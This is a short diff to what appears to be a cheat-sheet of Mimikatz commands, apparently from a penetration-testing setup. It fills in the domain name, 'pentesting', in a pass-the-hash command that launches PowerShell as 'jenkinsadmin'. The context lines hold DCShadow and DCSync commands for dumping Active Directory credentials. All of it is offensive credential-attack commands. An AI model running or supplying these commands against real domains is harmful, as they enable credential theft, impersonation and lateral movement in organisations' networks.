@@ -20,4 +20,4 @@ lsadump::dcshadow /push
 lsdump:dcsync /user:jenkinsadmin
 
 ---------------Pass the hash attack------------
-sekurlsa::pth /user:jenkinsadmin /domain: /ntlm:00000000000000000000000000000000 /run:powershell.exe
+sekurlsa::pth /user:jenkinsadmin /domain:pentesting /ntlm:00000000000000000000000000000000 /run:powershell.exe
